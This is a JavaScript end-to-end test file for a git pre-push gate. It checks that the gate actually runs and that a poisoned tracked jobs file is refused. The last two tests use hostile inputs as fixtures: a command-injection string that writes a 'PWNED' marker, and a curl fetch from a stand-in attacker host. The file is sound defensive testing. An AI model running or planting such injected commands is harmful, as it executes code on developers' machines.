// End-to-end tests for the local pre-push gate WIRING.
//
// Two defects are regression-guarded here, both of the same class: a check that
// reports success without ever executing.
//
//  1. tools/install-gate.sh chained the gate onto the existing hook but did not
//     forward stdin. .husky/pre-push drains stdin in its own `while read` loop,
//     so the delegated .githooks/pre-push received nothing, its
//     `[ -n "$PUSH_REFS" ]` guard was false, and GATE 1 — the committed-tree
//     coherence check — never ran while the hook printed success.
//
//  2. .githooks/pre-push ran each job from tools/gate-jobs.json through
//     `eval "$cmd"`. That file is TRACKED, so a merged edit to one string
//     executed on every developer's machine at their next push.
//
// These tests build a throwaway git repo, run the REAL installer against the
// REAL gate, and assert the gate actually fires. Unit-testing the validator
// (scripts/gate-jobs.test.cjs) is not enough on its own: the original bug was
// that correct logic was never reached.

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const REPO_ROOT = path.join(__dirname, '..');
const ZERO = '0'.repeat(40);

// ---------------------------------------------------------------------------
// git hooks run under git's OWN bash. On Windows, plain `bash` on PATH is
// usually WSL's, which resolves paths in a different filesystem namespace.
// ---------------------------------------------------------------------------
function resolveBash() {
  if (process.platform !== 'win32') return 'bash';
  const execPath = spawnSync('git', ['--exec-path'], { encoding: 'utf8' }).stdout.trim();
  const m = execPath.match(/^(.*)[\\/]mingw(?:32|64)[\\/]libexec[\\/]git-core$/i);
  const candidates = [];
  if (m) candidates.push(path.join(m[1], 'bin', 'bash.exe'));
  candidates.push('C:\\Program Files\\Git\\bin\\bash.exe', 'C:\\Program Files (x86)\\Git\\bin\\bash.exe');
  const found = candidates.find((c) => fs.existsSync(c));
  if (!found) {
    // Deliberately NOT a skip. This repo's hooks are bash; a machine that
    // cannot run them cannot verify them either, and a silent skip here would
    // reproduce the exact defect the file exists to catch.
    throw new Error(`git bash not found (looked in: ${candidates.join(', ')})`);
  }
  return found;
}
const BASH = resolveBash();

function git(cwd, ...args) {
  const r = spawnSync('git', args, { cwd, encoding: 'utf8' });
  if (r.status !== 0) throw new Error(`git ${args.join(' ')} failed: ${r.stderr || r.stdout}`);
  return r.stdout.trim();
}

/**
 * A throwaway repo shaped like 4DA: a `.husky/pre-push` host hook that captures
 * stdin once, exports GATE_PUSH_REFS, and feeds its own loop from the variable
 * — the same three moves the real .husky/pre-push makes.
 */
function makeRepo({ jobs } = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'gate-hook-'));
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, 'config', 'user.email', 'gate-test@example.invalid');
  git(dir, 'config', 'user.name', 'Gate Test');
  git(dir, 'config', 'commit.gpgsign', 'false');

  fs.mkdirSync(path.join(dir, '.githooks'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'tools'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'scripts'), { recursive: true });
  fs.mkdirSync(path.join(dir, '.husky'), { recursive: true });

  // The REAL gate, the REAL installer, the REAL validator.
  fs.copyFileSync(path.join(REPO_ROOT, '.githooks', 'pre-push'), path.join(dir, '.githooks', 'pre-push'));
  fs.copyFileSync(path.join(REPO_ROOT, 'tools', 'install-gate.sh'), path.join(dir, 'tools', 'install-gate.sh'));
  fs.copyFileSync(path.join(REPO_ROOT, 'scripts', 'gate-jobs.cjs'), path.join(dir, 'scripts', 'gate-jobs.cjs'));

  fs.writeFileSync(
    path.join(dir, 'tools', 'gate-jobs.json'),
    JSON.stringify({ jobs: jobs || [{ id: 'noop', cmd: 'node --version' }] }, null, 2),
  );

  // Host hook: captures stdin ONCE, exports it, feeds its own loop from the
  // variable. Mirrors .husky/pre-push; the assertion below pins that.
  fs.writeFileSync(
    path.join(dir, '.husky', 'pre-push'),
    [
      '#!/bin/sh',
      'echo "host hook running"',
      'GATE_PUSH_REFS="$(cat)"',
      'export GATE_PUSH_REFS',
      'while read L LS R RS; do',
      '  [ -n "$LS" ] || continue',
      '  echo "host saw ref $L"',
      'done <<HOST_EOF',
      '$GATE_PUSH_REFS',
      'HOST_EOF',
      'echo "host hook passed"',
      '',
    ].join('\n'),
  );

  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'gate-fixture', version: '1.0.0' }));
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', 'base');
  return dir;
}

function installGate(dir) {
  const r = spawnSync(BASH, ['tools/install-gate.sh'], { cwd: dir, encoding: 'utf8' });
  assert.equal(r.status, 0, `install-gate.sh failed: ${r.stderr}${r.stdout}`);
  return r;
}

function runHook(dir, refs) {
  return spawnSync(BASH, ['.husky/pre-push', 'origin', 'https://example.invalid/repo.git'], {
    cwd: dir,
    encoding: 'utf8',
    input: refs,
  });
}

// ---------------------------------------------------------------------------
// The two halves of the stdin fix, pinned against the real files
// ---------------------------------------------------------------------------

test('.husky/pre-push captures the pushed refs once and exports them', () => {
  const hook = fs.readFileSync(path.join(REPO_ROOT, '.husky', 'pre-push'), 'utf8');
  assert.match(hook, /GATE_PUSH_REFS="\$\(cat\)"/, 'must capture stdin into a variable');
  assert.match(hook, /export GATE_PUSH_REFS/, 'must export it for any chained hook');
  assert.doesNotMatch(
    hook,
    /while read LOCAL_REF LOCAL_SHA REMOTE_REF REMOTE_SHA; do[\s\S]*?\ndone\nexport/,
    'the loop must be fed from the variable, not raw stdin',
  );
  assert.match(hook, /done <<GATE_PUSH_REFS_EOF/, 'the ref loop must read from the captured variable');
});

test('install-gate.sh installs a block that FORWARDS the refs', () => {
  const dir = makeRepo();
  installGate(dir);
  const hook = fs.readFileSync(path.join(dir, '.husky', 'pre-push'), 'utf8');
  assert.match(hook, /# >>> local gate >>>/);
  assert.match(hook, /GATE_PUSH_REFS/, 'the delegate must forward the refs, not rely on drained stdin');
  assert.match(hook, /\.githooks\/pre-push/);
});

test('install-gate.sh UPGRADES a stale block instead of declaring victory', () => {
  const dir = makeRepo();
  // Simulate a machine that installed the old, non-forwarding one-liner.
  fs.appendFileSync(
    path.join(dir, '.husky', 'pre-push'),
    '\n# >>> local gate >>>\nbash "$(git rev-parse --show-toplevel)/.githooks/pre-push" "$@" || exit 1\n# <<< local gate <<<\n',
  );
  const r = installGate(dir);
  assert.match(r.stdout, /UPGRADED/);
  const hook = fs.readFileSync(path.join(dir, '.husky', 'pre-push'), 'utf8');
  assert.match(hook, /GATE_PUSH_REFS/);
  assert.equal((hook.match(/# >>> local gate >>>/g) || []).length, 1, 'must not stack duplicate blocks');

  // ...and running it again is a genuine no-op.
  const again = installGate(dir);
  assert.match(again.stdout, /already installed and up to date/);
});

// ---------------------------------------------------------------------------
// GATE 1 must actually FIRE through the chained host hook
// ---------------------------------------------------------------------------

test('GATE 1 fires through the chained hook and BLOCKS an incoherent tree', () => {
  const dir = makeRepo();
  installGate(dir);

  // A commit whose package.json cannot be parsed — exactly the "green locally,
  // garbage in the commit" corruption class GATE 1 exists to catch.
  fs.writeFileSync(path.join(dir, 'package.json'), '{ this is not json');
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', 'corrupt manifest');
  const sha = git(dir, 'rev-parse', 'HEAD');

  const r = runHook(dir, `refs/heads/main ${sha} refs/heads/main ${ZERO}\n`);
  const out = r.stdout + r.stderr;

  assert.match(out, /host hook running/, 'the host hook must have run first and drained stdin');
  assert.match(out, /host saw ref refs\/heads\/main/, 'the host must still see its own refs');
  assert.match(out, /GATE 1 FAIL/, 'GATE 1 must actually execute — this is the whole defect');
  assert.equal(r.status, 1, 'an incoherent pushed tree must block the push');
});

test('GATE 1 passes a coherent tree and the gate then runs GATE 2', () => {
  const dir = makeRepo();
  installGate(dir);
  const sha = git(dir, 'rev-parse', 'HEAD');

  const r = runHook(dir, `refs/heads/main ${sha} refs/heads/main ${ZERO}\n`);
  const out = r.stdout + r.stderr;

  assert.match(out, /GATE 1: committed-tree coherence OK/);
  assert.match(out, /GATE 2: running 1 fast offline checks/);
  assert.match(out, /PASS — push allowed/);
  assert.equal(r.status, 0);
});

// ---------------------------------------------------------------------------
// The tracked spec is no longer an execution channel
// ---------------------------------------------------------------------------

test('a poisoned tools/gate-jobs.json blocks the push and never executes', () => {
  const dir = makeRepo({
    jobs: [
      // Plain, valid shell. Under `eval "$cmd"` this ran and wrote the marker
      // file on every developer's machine at push time — verified against the
      // pre-fix hook. Now it is refused before anything is executed.
      { id: 'evil', cmd: 'node --version; echo pwned > PWNED' },
    ],
  });
  installGate(dir);
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', 'poison the tracked gate spec');
  const sha = git(dir, 'rev-parse', 'HEAD');

  const r = runHook(dir, `refs/heads/main ${sha} refs/heads/main ${ZERO}\n`);
  const out = r.stdout + r.stderr;

  assert.equal(r.status, 1, 'a poisoned spec must fail CLOSED');
  assert.match(out, /REFUSED/);
  assert.match(out, /did not pass validation/);
  assert.equal(fs.existsSync(path.join(dir, 'PWNED')), false, 'the injected command must NOT have run');
});

test('a non-allowlisted executable in the spec blocks the push', () => {
  const dir = makeRepo({ jobs: [{ id: 'curl-it', cmd: 'curl http://evil.example/payload' }] });
  installGate(dir);
  git(dir, 'add', '-A');
  git(dir, 'commit', '-qm', 'swap the executable');
  const sha = git(dir, 'rev-parse', 'HEAD');

  const r = runHook(dir, `refs/heads/main ${sha} refs/heads/main ${ZERO}\n`);
  assert.equal(r.status, 1);
  assert.match(r.stdout + r.stderr, /not on the gate allowlist/);
});
